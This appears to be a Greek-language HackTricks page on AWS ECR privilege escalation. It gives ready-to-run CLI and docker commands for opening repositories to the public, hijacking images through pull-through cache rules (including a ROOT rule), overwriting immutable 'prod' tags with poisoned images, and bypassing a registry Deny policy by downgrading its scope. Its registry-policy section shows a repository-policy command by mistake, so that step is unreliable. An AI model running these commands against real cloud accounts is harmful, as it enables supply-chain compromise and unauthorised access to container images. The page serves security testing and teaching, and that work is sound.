# AWS - ECR Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## ECR

### `ecr:GetAuthorizationToken`,`ecr:BatchGetImage`

Ένας επιτιθέμενος με τα **`ecr:GetAuthorizationToken`** και **`ecr:BatchGetImage`** μπορεί να συνδεθεί στο ECR και να κατεβάσει εικόνες.

Για περισσότερες πληροφορίες σχετικά με το πώς να κατεβάσετε εικόνες:

{{#ref}}
../../aws-post-exploitation/aws-ecr-post-exploitation/README.md
{{#endref}}

**Πιθανός αντίκτυπος:** Έμμεσο privesc μέσω υποκλοπής ευαίσθητων πληροφοριών στην κίνηση δικτύου.

### `ecr:GetAuthorizationToken`, `ecr:BatchCheckLayerAvailability`, `ecr:CompleteLayerUpload`, `ecr:InitiateLayerUpload`, `ecr:PutImage`, `ecr:UploadLayerPart`

Ένας επιτιθέμενος με όλες αυτές τις δικαιοδοσίες **μπορεί να συνδεθεί στο ECR και να ανεβάσει εικόνες**. Αυτό μπορεί να είναι χρήσιμο για την escalatοn προνομίων σε άλλα περιβάλλοντα όπου χρησιμοποιούνται αυτές οι εικόνες.

Για να μάθετε πώς να ανεβάσετε μια νέα εικόνα/να ενημερώσετε μία, δείτε:

{{#ref}}
../../aws-services/aws-eks-enum.md
{{#endref}}

### `ecr-public:GetAuthorizationToken`, `ecr-public:BatchCheckLayerAvailability, ecr-public:CompleteLayerUpload`, `ecr-public:InitiateLayerUpload, ecr-public:PutImage`, `ecr-public:UploadLayerPart`

Όπως στην προηγούμενη ενότητα, αλλά για δημόσια αποθετήρια.

### `ecr:SetRepositoryPolicy`

Ένας επιτιθέμενος με αυτό το δικαίωμα θα μπορούσε να **αλλάξει** την **πολιτική** του **αποθετηρίου** για να χορηγήσει στον εαυτό του (ή ακόμη και σε όλους) **πρόσβαση ανάγνωσης/εγγραφής**.\
Για παράδειγμα, σε αυτό το παράδειγμα η πρόσβαση ανάγνωσης δίνεται σε όλους.
```bash
aws ecr set-repository-policy \
--repository-name <repo_name> \
--policy-text file://my-policy.json
```
Περιεχόμενα του `my-policy.json`:
```json
{
"Version": "2008-10-17",
"Statement": [
{
"Sid": "allow public pull",
"Effect": "Allow",
"Principal": "*",
"Action": [
"ecr:BatchCheckLayerAvailability",
"ecr:BatchGetImage",
"ecr:GetDownloadUrlForLayer"
]
}
]
}
```
### `ecr-public:SetRepositoryPolicy`

Όπως η προηγούμενη ενότητα, αλλά για δημόσια αποθετήρια.\
Ένας επιτιθέμενος μπορεί να **τροποποιήσει την πολιτική αποθετηρίου** ενός ECR Public repository για να παραχωρήσει μη εξουσιοδοτημένη δημόσια πρόσβαση ή να αυξήσει τα προνόμιά του.
```bash
# Create a JSON file with the malicious public repository policy
echo '{
"Version": "2008-10-17",
"Statement": [
{
"Sid": "MaliciousPublicRepoPolicy",
"Effect": "Allow",
"Principal": "*",
"Action": [
"ecr-public:GetDownloadUrlForLayer",
"ecr-public:BatchGetImage",
"ecr-public:BatchCheckLayerAvailability",
"ecr-public:PutImage",
"ecr-public:InitiateLayerUpload",
"ecr-public:UploadLayerPart",
"ecr-public:CompleteLayerUpload",
"ecr-public:DeleteRepositoryPolicy"
]
}
]
}' > malicious_public_repo_policy.json

# Apply the malicious public repository policy to the ECR Public repository
aws ecr-public set-repository-policy --repository-name your-ecr-public-repo-name --policy-text file://malicious_public_repo_policy.json
```
**Πιθανός Αντίκτυπος**: Μη εξουσιοδοτημένη δημόσια πρόσβαση στο ECR Public repository, επιτρέποντας σε οποιονδήποτε χρήστη να push, pull, ή delete images.

### `ecr:PutRegistryPolicy`

Ένας επιτιθέμενος με αυτή την άδεια θα μπορούσε να **αλλάξει** την **registry policy** για να παραχωρήσει στον εαυτό του, στον λογαριασμό του (ή ακόμη και σε όλους) **πρόσβαση ανάγνωσης/εγγραφής**.
```bash
aws ecr set-repository-policy \
--repository-name <repo_name> \
--policy-text file://my-policy.json
```
### ecr:CreatePullThroughCacheRule

Καταχραστείτε τους κανόνους ECR Pull Through Cache (PTC) για να αντιστοιχίσετε ένα attacker-controlled upstream namespace σε ένα αξιόπιστο ιδιωτικό ECR prefix. Αυτό επιτρέπει σε workloads που κάνουν pull από το private ECR να λαμβάνουν διαφανώς attacker images χωρίς να απαιτείται push στο private ECR.

- Απαιτούμενα perms: ecr:CreatePullThroughCacheRule, ecr:DescribePullThroughCacheRules, ecr:DeletePullThroughCacheRule. If using ECR Public upstream: ecr-public:* to create/push to the public repo.
- Tested upstream: public.ecr.aws

Steps (example):

1. Prepare attacker image in ECR Public
# Get your ECR Public alias with: aws ecr-public describe-registries --region us-east-1
docker login public.ecr.aws/<public_alias>
docker build -t public.ecr.aws/<public_alias>/hacktricks-ptc-demo:ptc-test .
docker push public.ecr.aws/<public_alias>/hacktricks-ptc-demo:ptc-test

2. Create the PTC rule in private ECR to map a trusted prefix to the public registry
aws ecr create-pull-through-cache-rule --region us-east-2 --ecr-repository-prefix ptc --upstream-registry-url public.ecr.aws

3. Pull the attacker image via the private ECR path (no push to private ECR was done)
docker login <account_id>.dkr.ecr.us-east-2.amazonaws.com
docker pull <account_id>.dkr.ecr.us-east-2.amazonaws.com/ptc/<public_alias>/hacktricks-ptc-demo:ptc-test
docker run --rm <account_id>.dkr.ecr.us-east-2.amazonaws.com/ptc/<public_alias>/hacktricks-ptc-demo:ptc-test

Potential Impact: Συμβιβασμός supply-chain μέσω hijacking εσωτερικών ονομάτων image κάτω από το επιλεγμένο prefix. Οποιοδήποτε workload που pull-άρει εικόνες από το private ECR χρησιμοποιώντας αυτό το prefix θα λάβει attacker-controlled περιεχόμενο.

### `ecr:PutImageTagMutability`

Καταχραστείτε αυτό το permission για να αλλάξετε ένα repository με tag immutability σε mutable και να αντικαταστήσετε αξιόπιστα tags (π.χ., latest, stable, prod) με attacker-controlled περιεχόμενο.

- Required perms: `ecr:PutImageTagMutability` plus push capabilities (`ecr:GetAuthorizationToken`, `ecr:InitiateLayerUpload`, `ecr:UploadLayerPart`, `ecr:CompleteLayerUpload`, `ecr:PutImage`).
- Impact: Συμβιβασμός supply-chain με σιωπηρή αντικατάσταση immutable tags χωρίς αλλαγή ονομάτων tags.

Steps (example):

<details>
<summary>Δηλητηριάστε ένα immutable tag αλλάζοντας τη mutability</summary>
```bash
REGION=us-east-1
REPO=ht-immutable-demo-$RANDOM
aws ecr create-repository --region $REGION --repository-name $REPO --image-tag-mutability IMMUTABLE
acct=$(aws sts get-caller-identity --query Account --output text)
aws ecr get-login-password --region $REGION | docker login --username AWS --password-stdin ${acct}.dkr.ecr.${REGION}.amazonaws.com
# Build and push initial trusted tag
printf 'FROM alpine:3.19\nCMD echo V1\n' > Dockerfile && docker build -t ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod . && docker push ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod
# Attempt overwrite while IMMUTABLE (should fail)
printf 'FROM alpine:3.19\nCMD echo V2\n' > Dockerfile && docker build -t ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod . && docker push ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod
# Flip to MUTABLE and overwrite
aws ecr put-image-tag-mutability --region $REGION --repository-name $REPO --image-tag-mutability MUTABLE
docker push ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod
# Validate consumers pulling by tag now get the poisoned image (prints V2)
docker run --rm ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod
```
</details>


#### Global registry hijack μέσω ROOT Pull-Through Cache rule

Δημιουργήστε έναν κανόνα Pull-Through Cache (PTC) χρησιμοποιώντας το ειδικό `ecrRepositoryPrefix=ROOT` για να αντιστοιχίσετε τη ρίζα του ιδιωτικού ECR registry σε ένα upstream δημόσιο registry (π.χ., ECR Public). Οποιοδήποτε pull προς ένα ανύπαρκτο repository στο ιδιωτικό registry θα εξυπηρετηθεί διαφανώς από το upstream, επιτρέποντας supply-chain hijacking χωρίς να απαιτείται push στο private ECR.

- Απαιτούμενα perms: `ecr:CreatePullThroughCacheRule`, `ecr:DescribePullThroughCacheRules`, `ecr:DeletePullThroughCacheRule`, `ecr:GetAuthorizationToken`.
- Επίπτωση: Pulls προς `<account>.dkr.ecr.<region>.amazonaws.com/<any-existing-upstream-path>:<tag>` θα πετύχουν και θα δημιουργήσουν αυτόματα private repos που προέρχονται από upstream.

> Σημείωση: For `ROOT` rules, omit `--upstream-repository-prefix`. Supplying it will cause a validation error.

<details>
<summary>Demo (us-east-1, upstream public.ecr.aws)</summary>
```bash
REGION=us-east-1
ACCT=$(aws sts get-caller-identity --query Account --output text)

# 1) Create ROOT PTC rule mapping to ECR Public (no upstream prefix)
aws ecr create-pull-through-cache-rule \
--region "$REGION" \
--ecr-repository-prefix ROOT \
--upstream-registry-url public.ecr.aws

# 2) Authenticate to private ECR and pull via root path (triggers caching & auto repo creation)
aws ecr get-login-password --region "$REGION" | docker login --username AWS --password-stdin ${ACCT}.dkr.ecr.${REGION}.amazonaws.com

# Example using an official mirror path hosted in ECR Public
# (public.ecr.aws/docker/library/alpine:latest)
docker pull ${ACCT}.dkr.ecr.${REGION}.amazonaws.com/docker/library/alpine:latest

# 3) Verify repo and image now exist without any push
aws ecr describe-repositories --region "$REGION" \
--query "repositories[?repositoryName==docker/library/alpine]"
aws ecr list-images --region "$REGION" --repository-name docker/library/alpine --filter tagStatus=TAGGED

# 4) Cleanup
aws ecr delete-pull-through-cache-rule --region "$REGION" --ecr-repository-prefix ROOT
aws ecr delete-repository --region "$REGION" --repository-name docker/library/alpine --force || true
```
</details>

### `ecr:PutAccountSetting` (Υποβάθμιση `REGISTRY_POLICY_SCOPE` για παράκαμψη των registry policy Deny)

Καταχρήση του `ecr:PutAccountSetting` για αλλαγή του scope της registry policy από `V2` (πολιτική που εφαρμόζεται σε όλες τις ECR ενέργειες) σε `V1` (πολιτική που εφαρμόζεται μόνο σε `CreateRepository`, `ReplicateImage`, `BatchImportUpstreamImage`). Εάν μια περιοριστική registry policy Deny μπλοκάρει ενέργειες όπως `CreatePullThroughCacheRule`, η υποβάθμιση σε `V1` καταργεί αυτή την επιβολή ώστε να ισχύσουν τα identity‑policy Allows.

- Απαιτούμενα δικαιώματα: `ecr:PutAccountSetting`, `ecr:PutRegistryPolicy`, `ecr:GetRegistryPolicy`, `ecr:CreatePullThroughCacheRule`, `ecr:DescribePullThroughCacheRules`, `ecr:DeletePullThroughCacheRule`.
- Επίδραση: Δυνατότητα εκτέλεσης ECR ενεργειών που προηγουμένως ήταν μπλοκαρισμένες από μια registry policy Deny (π.χ., δημιουργία PTC κανόνων) με προσωρινή ρύθμιση του scope σε `V1`.

Βήματα (παράδειγμα):

<details>
<summary>Παράκαμψη του registry policy Deny στο CreatePullThroughCacheRule αλλάζοντας σε V1</summary>
```bash
REGION=us-east-1
ACCT=$(aws sts get-caller-identity --query Account --output text)

# 0) Snapshot current scope/policy (for restore)
aws ecr get-account-setting --name REGISTRY_POLICY_SCOPE --region $REGION || true
aws ecr get-registry-policy --region $REGION > /tmp/orig-registry-policy.json 2>/dev/null || echo '{}' > /tmp/orig-registry-policy.json

# 1) Ensure V2 and set a registry policy Deny for CreatePullThroughCacheRule
aws ecr put-account-setting --name REGISTRY_POLICY_SCOPE --value V2 --region $REGION
cat > /tmp/deny-ptc.json <<'JSON'
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "DenyPTCAll",
"Effect": "Deny",
"Principal": "*",
"Action": ["ecr:CreatePullThroughCacheRule"],
"Resource": "*"
}
]
}
JSON
aws ecr put-registry-policy --policy-text file:///tmp/deny-ptc.json --region $REGION

# 2) Attempt to create a PTC rule (should FAIL under V2 due to Deny)
set +e
aws ecr create-pull-through-cache-rule \
--region $REGION \
--ecr-repository-prefix ptc-deny-test \
--upstream-registry-url public.ecr.aws
RC=$?
set -e
if [ "$RC" -eq 0 ]; then echo "UNEXPECTED: rule creation succeeded under V2 deny"; fi

# 3) Downgrade scope to V1 and retry (should SUCCEED now)
aws ecr put-account-setting --name REGISTRY_POLICY_SCOPE --value V1 --region $REGION
aws ecr create-pull-through-cache-rule \
--region $REGION \
--ecr-repository-prefix ptc-deny-test \
--upstream-registry-url public.ecr.aws

# 4) Verify rule exists
aws ecr describe-pull-through-cache-rules --region $REGION \
--query "pullThroughCacheRules[?ecrRepositoryPrefix=='ptc-deny-test']"

# 5) Cleanup and restore
aws ecr delete-pull-through-cache-rule --region $REGION --ecr-repository-prefix ptc-deny-test || true
if jq -e '.registryPolicyText' /tmp/orig-registry-policy.json >/dev/null 2>&1; then
jq -r '.registryPolicyText' /tmp/orig-registry-policy.json > /tmp/_orig.txt
aws ecr put-registry-policy --region $REGION --policy-text file:///tmp/_orig.txt
else
aws ecr delete-registry-policy --region $REGION || true
fi
aws ecr put-account-setting --name REGISTRY_POLICY_SCOPE --value V2 --region $REGION
```
</details>

{{#include ../../../../banners/hacktricks-training.md}}
